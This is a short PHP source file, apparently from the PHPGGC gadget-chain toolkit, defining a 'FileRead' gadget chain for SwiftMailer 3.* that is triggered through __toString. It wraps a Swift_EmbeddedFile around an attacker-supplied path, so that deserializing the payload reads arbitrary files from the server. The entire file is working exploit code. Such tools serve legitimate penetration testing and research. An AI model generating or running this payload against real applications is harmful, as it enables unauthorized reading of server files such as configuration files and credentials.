<?php

namespace GadgetChain\SwiftMailer;

class FR1 extends \PHPGGC\GadgetChain\FileRead
{
    public static $version = '3.*';
    public static $vector = '__toString';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \Swift_EmbeddedFile($parameters['remote_path']);
    }
}